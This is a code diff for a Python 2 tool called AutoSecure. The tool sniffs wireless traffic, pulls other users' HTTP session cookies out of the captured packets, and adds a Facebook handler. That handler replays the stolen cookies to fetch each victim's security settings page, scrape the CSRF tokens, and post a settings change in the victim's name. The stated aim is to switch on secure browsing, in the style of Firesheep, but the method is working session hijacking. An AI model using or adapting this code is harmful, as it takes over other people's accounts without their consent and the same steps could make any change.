@@ -1,15 +1,52 @@
-import getopt, sys, pcap, dpkt, re, httplib, urllib
+import getopt, sys, pcap, dpkt, re, httplib
+import requests
+from pyquery import PyQuery as pq
+
 
 DEFAULT_UA = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MathPlayer 2.10b; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
 
 def re_extract(rex, data):
     m = re.search(rex, data)
     if m:
-        return m.group(0)
+        return m.groups()[0]
+
+class Facebook:
+    name = "Facebook"
+    site = ".facebook.com"
+    host = "www.facebook.com"
+    settings_url = "https://www.facebook.com/settings?tab=security&section=browsing&t"
+    url = "/ajax/settings/security/browsing.php"
+    payload = {"post_form_id": None,
+                "fb_dtsg": None,
+                "secure_browsing": "1"
+              }
+
+    def extract_user(self, session):
+        return re_extract("c_user=([^;]+)", session['Cookie'])
+
+    def secure(self, session):
+        payload = self.payload.copy()
+
+        settings_page = requests.get(self.settings_url, headers=session).content
+        q=pq(settings_page)
+
+        #TODO: refacter
+        post_form_id = q("[name=post_form_id]")[0].value
+        payload["post_form_id"] = post_form_id
+
+        fb_dtsg = q("[name=fb_dtsg]")[0].value
+        payload["fb_dtsg"] = fb_dtsg
+
+        url = 'https://' + session['Host'] + self.url
+        print 'sending payload', payload
+        r = requests.post(url, data=payload, headers=session)
+
+handlers = [Facebook]
 
 class AutoSecure:
     def __init__(self, device="wlan0"):
         self.device = device
+        self.secured_users = set()
 
     def get_packets(self):
         cap = pcap.pcap(self.device)
@@ -44,9 +81,20 @@ class AutoSecure:
             'User-Agent': ua,
         }
 
+    def secure_sesion(self, session):
+        for handler in handlers:
+            if session['Host'].endswith(handler.site):
+                h = handler()
+                user = h.extract_user(session)
+                if user  in self.secured_users:
+                    return
+                print "Securing", h.name, user
+                self.secured_users.add(user)
+                return h.secure(session)
+
     def secure_sheep(self):
-        for x in self.get_sessions():
-            print x
+        for s in self.get_sessions():
+            self.secure_sesion(s)
 
 if __name__ == "__main__":
     a = AutoSecure()
